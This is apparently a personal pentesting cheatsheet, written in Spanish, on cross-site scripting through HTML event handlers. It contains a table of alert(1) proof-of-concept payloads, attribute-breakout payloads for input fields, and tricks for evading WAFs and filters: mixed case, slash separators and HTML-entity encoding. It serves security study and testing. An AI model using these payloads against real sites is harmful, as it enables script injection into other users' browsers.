---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Manejadores de Eventos HTML

___

## Cheatsheet

|**Evento**|**Payload de Ejemplo**|**Contexto de Ejecución y Notas**|
|---|---|---|
|`onerror`|`<img src="x" onerror="alert(1)">`|Automático. Se dispara al fallar la carga de un recurso (origen inválido `x`). Altamente confiable.|
|`onload`|`<svg onload="alert(1)">`|Automático. Ejecuta el script tan pronto como el elemento se renderiza en la página.|
|`onfocus`|`<input autofocus onfocus="alert(1)">`|Automático / Interactivo. Combina el atributo `autofocus` para forzar el foco del navegador sobre el elemento.|
|`onmouseover`|`<b onmouseover="alert(1)">Texto</b>`|Interactivo. Requiere que la víctima pase el cursor sobre el elemento renderizado.|
|`onclick`|`<a href="#" onclick="alert(1)">Click</a>`|Interactivo. Depende del clic directo del usuario. Común en atributos de enlaces preexistentes.|
|`onanimationstart`|`<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>`|Automático. Asocia una animación CSS vacía a un elemento y dispara el script al iniciarla.|
|`onhashchange`|`<body onhashchange="alert(1)"><a href="#x">Click</a>`|Interactivo. Se ejecuta cuando cambia el fragmento de la URL (el ancla `#`).|

___

## Overview

Cuando las defensas de una aplicación web, como un [[Web Application Firewall]] (WAF) o un filtro de [[Sanitización]], bloquean explícitamente la etiqueta de script estándar, recurro a vectores alternativos. La inyección a través de manejadores de eventos (event handlers) HTML permite ejecutar código JavaScript aprovechando el ciclo de vida de las etiquetas estándar del [[DOM]] o la interacción del usuario.

El principio radica en inyectar atributos específicos (que comienzan con `on...`) dentro de etiquetas HTML permitidas, forzando al navegador a ejecutar el payload cuando se cumpla la condición del evento en lugar de depender de la ejecución directa de un bloque `<script>`.

### Inyección en Contextos Preexistentes

La efectividad de los manejadores de eventos se maximiza cuando no es posible inyectar etiquetas HTML nuevas, pero sí alterar los atributos de una etiqueta existente. Para lograr esto, es imperativo escapar del atributo donde aterriza la inyección.

- **Inyección en Atributo de Valor:** Si la entrada se refleja en `<input type="text" value="INYECCIÓN_AQUÍ">`, el objetivo es cerrar el atributo `value` y añadir el manejador de eventos sin cerrar la etiqueta.
    - Payload: `" autofocus onfocus="alert(1)`
    - Resultado en el DOM: `<input type="text" value="" autofocus onfocus="alert(1)">`
        
- **Inyección Dinámica de Tipos:** A veces es necesario sobrescribir propiedades del elemento anfitrión para habilitar el evento.
    - Payload: `" type="image" src="x" onerror="alert(1)`
    - Resultado en el DOM: `<input type="text" value="" type="image" src="x" onerror="alert(1)">`


___

## Evasión de Filtros Estructurales

Dado que los manejadores de eventos operan como atributos HTML, se benefician de las reglas de decodificación permisivas de los motores de los navegadores, ofreciendo vías adicionales para eludir restricciones de entrada:
- **Insensibilidad a Mayúsculas:** Los nombres de atributos no distinguen entre mayúsculas y minúsculas en HTML. `oNeRrOr=alert(1)` es procesado de forma idéntica a `onerror=alert(1)`.
- **Uso de Separadores Alternativos:** Los navegadores aceptan múltiples delimitadores entre atributos, no solo espacios. Se pueden utilizar barras diagonales (`/`) u otros espacios en blanco. Ej: `<svg/onload=alert(1)>`
- **Codificación de Entidades en el Payload:** A diferencia de la etiqueta de script directa, el contenido dentro de un manejador de eventos HTML se decodifica _antes_ de enviarse al intérprete de JavaScript. Esto me permite ofuscar el código mediante entidades HTML. Ej: `<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`